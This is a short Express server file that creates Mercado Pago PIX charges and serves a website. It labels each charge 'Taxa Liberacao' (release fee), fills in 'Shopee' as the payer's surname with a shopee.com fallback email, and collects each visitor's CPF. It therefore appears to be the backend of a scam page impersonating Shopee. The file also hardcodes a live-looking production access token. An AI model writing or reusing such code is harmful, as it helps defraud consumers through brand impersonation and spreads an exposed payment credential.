import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';

const app = express();

// 1. DESATIVAR CACHE (ISSO RESOLVE O SEU PROBLEMA)
app.disable('etag');
app.use((req, res, next) => {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    next();
});

app.use(express.json());
app.use(cors({ origin: '*' }));

// 2. ROTA API PIX (MERCADO PAGO)
app.post('/pix', async (req, res) => {
    console.log("🔔 [PIX] Pedido Recebido!");
    try {
        const { amount, name, cpf, email } = req.body;
        
        // Token de Produção
        const ACCESS_TOKEN = 'APP_USR-7433336192149093-020423-97cd4e2614f56c0f43836231bfb0e432-202295570';

        const payload = {
            transaction_amount: Number(amount) || 37.90,
            description: "Taxa Liberacao",
            payment_method_id: "pix",
            payer: {
                email: (email && email.includes('@')) ? email : "pagamento@shopee.com",
                first_name: String(name).split(' ')[0] || "Cliente",
                last_name: "Shopee",
                identification: { type: "CPF", number: String(cpf).replace(/\D/g, '') }
            }
        };

        const response = await axios.post('https://api.mercadopago.com/v1/payments', payload, {
            headers: {
                'Authorization': `Bearer ${ACCESS_TOKEN}`,
                'Content-Type': 'application/json',
                'X-Idempotency-Key': `pix-${Date.now()}`
            }
        });

        console.log("✅ PIX CRIADO: ID", response.data.id);
        res.status(201).json(response.data);

    } catch (error: any) {
        console.error("❌ ERRO MP:", error.response?.data || error.message);
        res.status(500).json({ error: "Erro Pix", detalhes: error.response?.data });
    }
});

// 3. SERVIR SITE
app.use(express.static(path.join(__dirname, '../')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 SERVIDOR NOVO NO AR - PORTA ${PORT}`));